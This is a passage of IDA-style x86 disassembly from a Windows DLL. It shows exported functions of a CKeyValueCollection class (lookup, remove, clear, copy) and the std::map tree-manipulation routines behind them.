		lea	eax, [ebp+var_4]
		push	eax
		lea	ecx, [esi+78h]
		call	sub_6AF35CDA
		mov	esi, [esi+7Ch]
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		cmp	[ebp+var_4], esi
		pop	esi
		setnz	al
		leave
		retn	4
Ordinal214	endp

; Exported entry 215.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal215
Ordinal215	proc near		; DATA XREF: .rdata:6AF560F8o
					; .rdata:off_6AF66098o

arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		and	dword ptr [edi], 0
		lea	eax, [ebp+arg_0]
		push	eax
		mov	esi, ecx
		lea	eax, [ebp+arg_4]
		push	eax
		lea	ecx, [esi+78h]
		call	sub_6AF35CDA
		mov	eax, [ebp+arg_4]
		cmp	eax, [esi+7Ch]
		jnz	short loc_6AF35F14
		push	offset aCkeyvaluecol_3 ; "CKeyValueCollection::GetReadValue() :	p"...
		call	sub_6AF3101A
		pop	ecx
		xor	al, al
		jmp	short loc_6AF35F1B
; ---------------------------------------------------------------------------

loc_6AF35F14:				; CODE XREF: Ordinal215+23j
		add	eax, 18h
		mov	[edi], eax
		mov	al, 1

loc_6AF35F1B:				; CODE XREF: Ordinal215+32j
		pop	edi
		pop	esi
		pop	ebp
		retn	8
Ordinal215	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF35F21(int, void *)
sub_6AF35F21	proc near		; CODE XREF: Ordinal210+4Ap
					; sub_6AF36472+3Bp

var_54		= dword	ptr -54h
var_2C		= byte ptr -2Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_41 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		push	ebx
		mov	ebx, [ebp+arg_4]
		cmp	byte ptr [ebx+61h], 0
		push	esi
		push	edi
		mov	[ebp+var_10], ecx
		jz	short loc_6AF35F70
		push	offset aInvalidMapSetT ; "invalid map/set<T> iterator"
		lea	ecx, [ebp+var_2C]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_2C]
		push	eax
		lea	ecx, [ebp+var_54]
		call	sub_6AF3136A
		push	offset dword_6AF61F1C
		lea	eax, [ebp+var_54]
		push	eax
		mov	[ebp+var_54], offset off_6AF548A0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF35F70:				; CODE XREF: sub_6AF35F21+1Aj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF359C3
		mov	ecx, [ebx]
		cmp	byte ptr [ecx+61h], 0
		jz	short loc_6AF35F85
		mov	edi, [ebx+8]
		jmp	short loc_6AF35F9C
; ---------------------------------------------------------------------------

loc_6AF35F85:				; CODE XREF: sub_6AF35F21+5Dj
		mov	eax, [ebx+8]
		cmp	byte ptr [eax+61h], 0
		jz	short loc_6AF35F92
		mov	edi, ecx
		jmp	short loc_6AF35F9C
; ---------------------------------------------------------------------------

loc_6AF35F92:				; CODE XREF: sub_6AF35F21+6Bj
		mov	eax, [ebp+arg_4]
		cmp	eax, ebx
		mov	edi, [eax+8]
		jnz	short loc_6AF36012

loc_6AF35F9C:				; CODE XREF: sub_6AF35F21+62j
					; sub_6AF35F21+6Fj
		cmp	byte ptr [edi+61h], 0
		mov	esi, [ebx+4]
		jnz	short loc_6AF35FA8
		mov	[edi+4], esi

loc_6AF35FA8:				; CODE XREF: sub_6AF35F21+82j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	[eax+4], ebx
		jnz	short loc_6AF35FB8
		mov	[eax+4], edi
		jmp	short loc_6AF35FC3
; ---------------------------------------------------------------------------

loc_6AF35FB8:				; CODE XREF: sub_6AF35F21+90j
		cmp	[esi], ebx
		jnz	short loc_6AF35FC0
		mov	[esi], edi
		jmp	short loc_6AF35FC3
; ---------------------------------------------------------------------------

loc_6AF35FC0:				; CODE XREF: sub_6AF35F21+99j
		mov	[esi+8], edi

loc_6AF35FC3:				; CODE XREF: sub_6AF35F21+95j
					; sub_6AF35F21+9Dj
		mov	ecx, [ecx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF35FE6
		cmp	byte ptr [edi+61h], 0
		jz	short loc_6AF35FD4
		mov	edx, esi
		jmp	short loc_6AF35FE4
; ---------------------------------------------------------------------------

loc_6AF35FD4:				; CODE XREF: sub_6AF35F21+ADj
		mov	eax, [edi]
		mov	edx, edi
		jmp	short loc_6AF35FDE
; ---------------------------------------------------------------------------

loc_6AF35FDA:				; CODE XREF: sub_6AF35F21+C1j
		mov	edx, eax
		mov	eax, [edx]

loc_6AF35FDE:				; CODE XREF: sub_6AF35F21+B7j
		cmp	byte ptr [eax+61h], 0
		jz	short loc_6AF35FDA

loc_6AF35FE4:				; CODE XREF: sub_6AF35F21+B1j
		mov	[ecx], edx

loc_6AF35FE6:				; CODE XREF: sub_6AF35F21+A7j
		mov	eax, [ebp+var_10]
		mov	ecx, [eax+4]
		cmp	[ecx+8], ebx
		jnz	short loc_6AF3606C
		cmp	byte ptr [edi+61h], 0
		jz	short loc_6AF35FFB
		mov	edx, esi
		jmp	short loc_6AF3600D
; ---------------------------------------------------------------------------

loc_6AF35FFB:				; CODE XREF: sub_6AF35F21+D4j
		mov	eax, [edi+8]
		mov	edx, edi
		jmp	short loc_6AF36007
; ---------------------------------------------------------------------------

loc_6AF36002:				; CODE XREF: sub_6AF35F21+EAj
		mov	edx, eax
		mov	eax, [edx+8]

loc_6AF36007:				; CODE XREF: sub_6AF35F21+DFj
		cmp	byte ptr [eax+61h], 0
		jz	short loc_6AF36002

loc_6AF3600D:				; CODE XREF: sub_6AF35F21+D8j
		mov	[ecx+8], edx
		jmp	short loc_6AF3606C
; ---------------------------------------------------------------------------

loc_6AF36012:				; CODE XREF: sub_6AF35F21+79j
		mov	[ecx+4], eax
		mov	ecx, [ebx]
		mov	[eax], ecx
		cmp	eax, [ebx+8]
		jnz	short loc_6AF36022
		mov	esi, eax
		jmp	short loc_6AF3603C
; ---------------------------------------------------------------------------

loc_6AF36022:				; CODE XREF: sub_6AF35F21+FBj
		cmp	byte ptr [edi+61h], 0
		mov	esi, [eax+4]
		jnz	short loc_6AF3602E
		mov	[edi+4], esi

loc_6AF3602E:				; CODE XREF: sub_6AF35F21+108j
		mov	[esi], edi
		mov	ecx, [ebx+8]
		mov	[eax+8], ecx
		mov	ecx, [ebx+8]
		mov	[ecx+4], eax

loc_6AF3603C:				; CODE XREF: sub_6AF35F21+FFj
		mov	ecx, [ebp+var_10]
		mov	ecx, [ecx+4]
		cmp	[ecx+4], ebx
		jnz	short loc_6AF3604C
		mov	[ecx+4], eax
		jmp	short loc_6AF3605A
; ---------------------------------------------------------------------------

loc_6AF3604C:				; CODE XREF: sub_6AF35F21+124j
		mov	ecx, [ebx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF36057
		mov	[ecx], eax
		jmp	short loc_6AF3605A
; ---------------------------------------------------------------------------

loc_6AF36057:				; CODE XREF: sub_6AF35F21+130j
		mov	[ecx+8], eax

loc_6AF3605A:				; CODE XREF: sub_6AF35F21+129j
					; sub_6AF35F21+134j
		mov	ecx, [ebx+4]
		mov	[eax+4], ecx
		mov	dl, [ebx+60h]
		mov	cl, [eax+60h]
		mov	[eax+60h], dl
		mov	[ebx+60h], cl

loc_6AF3606C:				; CODE XREF: sub_6AF35F21+CEj
					; sub_6AF35F21+EFj
		cmp	byte ptr [ebx+60h], 1
		jnz	loc_6AF36179
		jmp	loc_6AF3612D
; ---------------------------------------------------------------------------

loc_6AF3607B:				; CODE XREF: sub_6AF35F21+215j
		cmp	byte ptr [edi+60h], 1
		jnz	loc_6AF36175
		mov	eax, [esi]
		cmp	edi, eax
		jnz	short loc_6AF360F7
		mov	eax, [esi+8]
		cmp	byte ptr [eax+60h], 0
		jnz	short loc_6AF360A5
		mov	byte ptr [eax+60h], 1
		push	esi
		mov	byte ptr [esi+60h], 0
		call	sub_6AF35A90
		mov	eax, [esi+8]

loc_6AF360A5:				; CODE XREF: sub_6AF35F21+171j
		cmp	byte ptr [eax+61h], 0
		jnz	short loc_6AF36128
		mov	ecx, [eax]
		cmp	byte ptr [ecx+60h], 1
		jnz	short loc_6AF360BC
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+60h], 1
		jz	short loc_6AF36124

loc_6AF360BC:				; CODE XREF: sub_6AF35F21+190j
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+60h], 1
		jnz	short loc_6AF360DB
		mov	ecx, [eax]
		mov	byte ptr [ecx+60h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+60h], 0
		call	sub_6AF35962
		mov	eax, [esi+8]

loc_6AF360DB:				; CODE XREF: sub_6AF35F21+1A2j
		mov	cl, [esi+60h]
		mov	[eax+60h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+60h], 1
		mov	eax, [eax+8]
		push	esi
		mov	byte ptr [eax+60h], 1
		call	sub_6AF35A90
		jmp	short loc_6AF36175
; ---------------------------------------------------------------------------

loc_6AF360F7:				; CODE XREF: sub_6AF35F21+168j
		cmp	byte ptr [eax+60h], 0
		jnz	short loc_6AF3610D
		mov	byte ptr [eax+60h], 1
		push	esi
		mov	byte ptr [esi+60h], 0
		call	sub_6AF35962
		mov	eax, [esi]

loc_6AF3610D:				; CODE XREF: sub_6AF35F21+1DAj
		cmp	byte ptr [eax+61h], 0
		jnz	short loc_6AF36128
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+60h], 1
		jnz	short loc_6AF3613E
		mov	ecx, [eax]
		cmp	byte ptr [ecx+60h], 1
		jnz	short loc_6AF3613E

loc_6AF36124:				; CODE XREF: sub_6AF35F21+199j
		mov	byte ptr [eax+60h], 0

loc_6AF36128:				; CODE XREF: sub_6AF35F21+188j
					; sub_6AF35F21+1F0j
		mov	edi, esi
		mov	esi, [esi+4]

loc_6AF3612D:				; CODE XREF: sub_6AF35F21+155j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	edi, [eax+4]
		jnz	loc_6AF3607B
		jmp	short loc_6AF36175
; ---------------------------------------------------------------------------

loc_6AF3613E:				; CODE XREF: sub_6AF35F21+1F9j
					; sub_6AF35F21+201j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+60h], 1
		jnz	short loc_6AF3615C
		mov	ecx, [eax+8]
		mov	byte ptr [ecx+60h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+60h], 0
		call	sub_6AF35A90
		mov	eax, [esi]

loc_6AF3615C:				; CODE XREF: sub_6AF35F21+223j
		mov	cl, [esi+60h]
		mov	[eax+60h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+60h], 1
		mov	eax, [eax]
		push	esi
		mov	byte ptr [eax+60h], 1
		call	sub_6AF35962

loc_6AF36175:				; CODE XREF: sub_6AF35F21+15Ej
					; sub_6AF35F21+1D4j ...
		mov	byte ptr [edi+60h], 1

loc_6AF36179:				; CODE XREF: sub_6AF35F21+14Fj
		lea	ecx, [ebx+18h]
		call	Ordinal246
		push	ebx		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+8]
		test	eax, eax
		pop	edi
		pop	esi
		pop	ebx
		jbe	short loc_6AF36199
		dec	eax
		mov	[ecx+8], eax

loc_6AF36199:				; CODE XREF: sub_6AF35F21+272j
		mov	ecx, [ebp+arg_4]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn	8
sub_6AF35F21	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF361AF(void *)
sub_6AF361AF	proc near		; CODE XREF: sub_6AF361AF+16p
					; sub_6AF362F6+6p ...

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]
		cmp	byte ptr [edi+61h], 0
		mov	ebx, ecx
		mov	esi, edi
		jnz	short loc_6AF361E2

loc_6AF361C0:				; CODE XREF: sub_6AF361AF+31j
		push	dword ptr [esi+8] ; void *
		mov	ecx, ebx
		call	sub_6AF361AF
		mov	esi, [esi]
		mov	ecx, edi
		call	sub_6AF35A55
		push	edi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		cmp	byte ptr [esi+61h], 0
		pop	ecx
		mov	edi, esi
		jz	short loc_6AF361C0

loc_6AF361E2:				; CODE XREF: sub_6AF361AF+Fj
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_6AF361AF	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF361E8	proc near		; CODE XREF: sub_6AF36397+C8p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		mov	esi, ecx
		mov	ecx, [esi+4]
		mov	eax, [ecx+4]
		cmp	byte ptr [eax+61h], 0
		push	edi
		mov	edi, ecx
		mov	byte ptr [ebp+var_4], 1
		jnz	short loc_6AF36224
		mov	ecx, [ebx]

loc_6AF36208:				; CODE XREF: sub_6AF361E8+3Aj
		cmp	ecx, [eax+10h]
		mov	edi, eax
		setb	byte ptr [ebp+var_4]
		cmp	byte ptr [ebp+var_4], 0
		jz	short loc_6AF3621B
		mov	eax, [eax]
		jmp	short loc_6AF3621E
; ---------------------------------------------------------------------------

loc_6AF3621B:				; CODE XREF: sub_6AF361E8+2Dj
		mov	eax, [eax+8]

loc_6AF3621E:				; CODE XREF: sub_6AF361E8+31j
		cmp	byte ptr [eax+61h], 0
		jz	short loc_6AF36208

loc_6AF36224:				; CODE XREF: sub_6AF361E8+1Cj
		cmp	byte ptr [ebp+var_4], 0
		mov	ecx, edi
		mov	[ebp+arg_4], ecx
		jz	short loc_6AF36247
		mov	eax, [esi+4]
		cmp	edi, [eax]
		jnz	short loc_6AF3623C
		push	ebx
		push	edi
		push	1
		jmp	short loc_6AF36253
; ---------------------------------------------------------------------------

loc_6AF3623C:				; CODE XREF: sub_6AF361E8+4Cj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF359F9
		mov	ecx, [ebp+arg_4]

loc_6AF36247:				; CODE XREF: sub_6AF361E8+45j
		mov	eax, [ecx+10h]
		cmp	eax, [ebx]
		jnb	short loc_6AF36269
		push	ebx
		push	edi
		push	[ebp+var_4]

loc_6AF36253:				; CODE XREF: sub_6AF361E8+52j
		lea	eax, [ebp+arg_4]
		push	eax
		mov	ecx, esi
		call	sub_6AF35D39
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+4], 1
		jmp	short loc_6AF36270
; ---------------------------------------------------------------------------

loc_6AF36269:				; CODE XREF: sub_6AF361E8+64j
		mov	eax, [ebp+arg_0]
		mov	byte ptr [eax+4], 0

loc_6AF36270:				; CODE XREF: sub_6AF361E8+7Fj
		pop	edi
		pop	esi
		mov	[eax], ecx
		pop	ebx
		leave
		retn	8
sub_6AF361E8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF36279	proc near		; CODE XREF: sub_6AF36279+54p
					; sub_6AF36279+61p ...

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_42 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		cmp	byte ptr [esi+61h], 0
		push	edi
		mov	edi, ecx
		mov	eax, [edi+4]
		mov	[ebp+var_10], esp
		mov	[ebp+var_18], edi
		mov	[ebp+var_14], eax
		jnz	short loc_6AF362E2
		xor	ecx, ecx
		mov	cl, [esi+60h]
		push	ecx
		lea	ecx, [esi+10h]
		push	ecx
		push	eax
		push	[ebp+arg_4]
		mov	ecx, edi
		push	eax
		call	sub_6AF35B8D
		mov	ebx, eax
		mov	eax, [ebp+var_14]
		cmp	byte ptr [eax+61h], 0
		jz	short loc_6AF362C4
		mov	[ebp+var_14], ebx

loc_6AF362C4:				; CODE XREF: sub_6AF36279+46j
		and	[ebp+var_4], 0
		push	ebx
		push	dword ptr [esi]
		mov	ecx, edi
		call	sub_6AF36279
		push	ebx
		mov	[ebx], eax
		push	dword ptr [esi+8]
		mov	ecx, edi
		call	sub_6AF36279
		mov	[ebx+8], eax

loc_6AF362E2:				; CODE XREF: sub_6AF36279+25j
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_14]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	8
sub_6AF36279	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_6AF362F6	proc near		; DATA XREF: .rdata:stru_6AF62590o
		push	dword ptr [ebp-14h] ; void *
		mov	ecx, [ebp-18h]
		call	sub_6AF361AF
		push	0
		push	0
		call	_CxxThrowException
sub_6AF362F6	endp

; ---------------------------------------------------------------------------
		db 0CCh
; Exported entry 210.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal210
Ordinal210	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+arg_0]
		push	eax
		lea	eax, [ebp+var_4]
		lea	edi, [esi+78h]
		push	eax
		mov	ecx, edi
		call	sub_6AF35CDA
		mov	eax, [ebp+var_4]
		cmp	eax, [esi+7Ch]
		jnz	short loc_6AF3634E
		push	offset aCkeyvaluecol_4 ; "CKeyValueCollection::Remove()	: pos == "...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF36360
; ---------------------------------------------------------------------------

loc_6AF3634E:				; CODE XREF: Ordinal210+34j
		push	eax		; void *
		lea	eax, [ebp+arg_0]
		push	eax		; int
		mov	ecx, edi
		call	sub_6AF35F21
		mov	byte ptr [esi+8], 1
		mov	bl, 1

loc_6AF36360:				; CODE XREF: Ordinal210+41j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal210	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF36371	proc near		; CODE XREF: sub_6AF36472+18p
					; Ordinal211+1Cp
		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+4]
		mov	eax, [esi]
		push	dword ptr [eax+4] ; void *
		call	sub_6AF361AF
		mov	eax, [esi]
		mov	[eax+4], eax
		mov	eax, [esi]
		and	dword ptr [edi+8], 0
		mov	[eax], eax
		mov	esi, [esi]
		pop	edi
		mov	[esi+8], esi
		pop	esi
		retn
sub_6AF36371	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF36397	proc near		; CODE XREF: sub_6AF36793+51p

var_8		= byte ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		mov	ebx, ecx
		cmp	dword ptr [ebx+8], 0
		jnz	short loc_6AF363BD
		push	[ebp+arg_8]
		push	dword ptr [ebx+4]
		push	1
		push	[ebp+arg_0]
		call	sub_6AF35D39
		mov	eax, [ebp+arg_0]
		jmp	loc_6AF3646D
; ---------------------------------------------------------------------------

loc_6AF363BD:				; CODE XREF: sub_6AF36397+Cj
		mov	eax, [ebx+4]
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	esi, [eax]
		push	edi
		mov	edi, [ebp+arg_8]
		jnz	short loc_6AF363DB
		mov	eax, [edi]
		cmp	eax, [esi+10h]
		jnb	loc_6AF36458
		push	edi

loc_6AF363D8:				; CODE XREF: sub_6AF36397+7Cj
		push	esi
		jmp	short loc_6AF36447
; ---------------------------------------------------------------------------

loc_6AF363DB:				; CODE XREF: sub_6AF36397+33j
		cmp	esi, eax
		jnz	short loc_6AF363EF
		mov	eax, [eax+8]
		mov	ecx, [eax+10h]
		cmp	ecx, [edi]
		jnb	short loc_6AF36458
		push	edi
		push	eax

loc_6AF363EB:				; CODE XREF: sub_6AF36397+7Fj
					; sub_6AF36397+ADj
		push	0
		jmp	short loc_6AF36449
; ---------------------------------------------------------------------------

loc_6AF363EF:				; CODE XREF: sub_6AF36397+46j
		mov	eax, [edi]
		cmp	eax, [esi+10h]
		jnb	short loc_6AF36418
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF359F9
		mov	ecx, [ebp+arg_8]
		mov	eax, [edi]
		cmp	[ecx+10h], eax
		jnb	short loc_6AF36418
		mov	eax, [ecx+8]
		cmp	byte ptr [eax+61h], 0
		push	edi
		jz	short loc_6AF363D8
		push	ecx
		jmp	short loc_6AF363EB
; ---------------------------------------------------------------------------

loc_6AF36418:				; CODE XREF: sub_6AF36397+5Dj
					; sub_6AF36397+72j
		mov	eax, [edi]
		cmp	[esi+10h], eax
		jnb	short loc_6AF36458
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF359C3
		mov	ecx, [ebp+arg_8]
		cmp	ecx, [ebx+4]
		jz	short loc_6AF36439
		mov	eax, [edi]
		cmp	eax, [ecx+10h]
		jnb	short loc_6AF36458

loc_6AF36439:				; CODE XREF: sub_6AF36397+99j
		mov	eax, [esi+8]
		cmp	byte ptr [eax+61h], 0
		push	edi
		jz	short loc_6AF36446
		push	esi
		jmp	short loc_6AF363EB
; ---------------------------------------------------------------------------

loc_6AF36446:				; CODE XREF: sub_6AF36397+AAj
		push	ecx

loc_6AF36447:				; CODE XREF: sub_6AF36397+42j
		push	1

loc_6AF36449:				; CODE XREF: sub_6AF36397+56j
		push	[ebp+arg_0]
		mov	ecx, ebx
		call	sub_6AF35D39
		mov	eax, [ebp+arg_0]
		jmp	short loc_6AF3646B
; ---------------------------------------------------------------------------

loc_6AF36458:				; CODE XREF: sub_6AF36397+3Aj
					; sub_6AF36397+50j ...
		push	edi
		lea	eax, [ebp+var_8]
		push	eax
		mov	ecx, ebx
		call	sub_6AF361E8
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx

loc_6AF3646B:				; CODE XREF: sub_6AF36397+BFj
		pop	edi
		pop	esi

loc_6AF3646D:				; CODE XREF: sub_6AF36397+21j
		pop	ebx
		leave
		retn	0Ch
sub_6AF36397	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF36472(int, void *, int)
sub_6AF36472	proc near		; CODE XREF: sub_6AF36523+12p
					; sub_6AF36812+19p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [eax]
		jnz	short loc_6AF36496
		cmp	[ebp+arg_8], eax
		jnz	short loc_6AF36496
		mov	ecx, esi
		call	sub_6AF36371
		mov	eax, [esi+4]
		mov	ecx, [eax]
		jmp	short loc_6AF364BB
; ---------------------------------------------------------------------------

loc_6AF36496:				; CODE XREF: sub_6AF36472+Fj
					; sub_6AF36472+14j
		cmp	ecx, [ebp+arg_8]
		jz	short loc_6AF364BB
		push	edi

loc_6AF3649C:				; CODE XREF: sub_6AF36472+46j
		mov	edi, ecx
		lea	ecx, [ebp+arg_4]
		call	sub_6AF359C3
		push	edi		; void *
		lea	eax, [ebp+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF35F21
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [ebp+arg_8]
		jnz	short loc_6AF3649C
		pop	edi

loc_6AF364BB:				; CODE XREF: sub_6AF36472+22j
					; sub_6AF36472+27j
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		pop	esi
		leave
		retn	0Ch
sub_6AF36472	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF364C5	proc near		; CODE XREF: sub_6AF36812+23p

arg_0		= dword	ptr  4

		push	ebx
		mov	ebx, [esp+4+arg_0]
		mov	eax, [ebx+4]
		push	esi
		push	edi
		mov	esi, ecx
		mov	edi, [esi+4]
		push	edi
		push	dword ptr [eax+4]
		call	sub_6AF36279
		mov	[edi+4], eax
		mov	eax, [ebx+8]
		mov	[esi+8], eax
		mov	eax, [esi+4]
		mov	ecx, [eax+4]
		xor	bl, bl
		cmp	[ecx+61h], bl
		jz	short loc_6AF36503
		mov	[eax], eax
		mov	esi, [esi+4]
		mov	[esi+8], esi

loc_6AF364FB:				; CODE XREF: sub_6AF364C5+5Cj
		pop	edi
		pop	esi
		pop	ebx
		retn	4
; ---------------------------------------------------------------------------

loc_6AF36501:				; CODE XREF: sub_6AF364C5+43j
		mov	ecx, edx

loc_6AF36503:				; CODE XREF: sub_6AF364C5+2Cj
		mov	edx, [ecx]
		cmp	[edx+61h], bl
		jz	short loc_6AF36501
		mov	[eax], ecx
		mov	esi, [esi+4]
		mov	ecx, [esi+4]
		jmp	short loc_6AF36516
; ---------------------------------------------------------------------------

loc_6AF36514:				; CODE XREF: sub_6AF364C5+57j
		mov	ecx, eax

loc_6AF36516:				; CODE XREF: sub_6AF364C5+4Dj
		mov	eax, [ecx+8]
		cmp	[eax+61h], bl
		jz	short loc_6AF36514
		mov	[esi+8], ecx
		jmp	short loc_6AF364FB
sub_6AF364C5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF36523	proc near		; CODE XREF: sub_6AF36841j

var_4		= dword	ptr -4

		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [eax]
		push	eax		; int
		push	ecx		; void *
		lea	eax, [esp+10h+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF36472
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		pop	ecx
		pop	esi
		pop	ecx
		retn
sub_6AF36523	endp

; Exported entry 211.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal211
Ordinal211	proc near		; CODE XREF: Ordinal212+1Ep
					; Ordinal212+121p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+78h]
		call	sub_6AF36371
		lea	ecx, [ebp+var_C]
		mov	byte ptr [esi+8], 1
		call	Ordinal1230
		mov	al, 1
		pop	esi
		leave
		retn
Ordinal211	endp

; Exported entry 212.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal212
Ordinal212	proc near		; DATA XREF: .rdata:off_6AF66098o

var_24		= byte ptr -24h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_24]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal211
		mov	edi, [ebp+arg_0]
		push	edi
		lea	ecx, [ebp+var_C]
		call	sub_6AF35B4E
		cmp	[ebp+var_C], ebx
		jnz	short loc_6AF365C4
		push	offset aCkeyvaluecol_5 ; "CKeyValueCollection::Copy() :	pKeyValue"...

loc_6AF365B9:				; CODE XREF: Ordinal212+5Bj
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF36666
; ---------------------------------------------------------------------------

loc_6AF365C4:				; CODE XREF: Ordinal212+32j
		mov	eax, [edi]
		lea	ecx, [ebp+var_8]
		push	ecx
		mov	ecx, edi
		mov	[ebp+var_8], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF365DD
		push	offset aCkeyvaluecol_6 ; "CKeyValueCollection::Copy() :	pValueCol"...
		jmp	short loc_6AF365B9
; ---------------------------------------------------------------------------

loc_6AF365DD:				; CODE XREF: Ordinal212+54j
		cmp	[ebp+var_8], ebx
		mov	[ebp+var_14], ebx
		mov	[ebp+var_18], ebx
		mov	[ebp+var_4], ebx
		mov	[ebp+var_10], ebx
		mov	[ebp+arg_0], ebx
		jbe	short loc_6AF36660

loc_6AF365F1:				; CODE XREF: Ordinal212+DEj
		mov	ecx, [ebp+var_C]
		mov	eax, [ecx]
		lea	edx, [ebp+var_4]
		push	edx
		push	[ebp+arg_0]
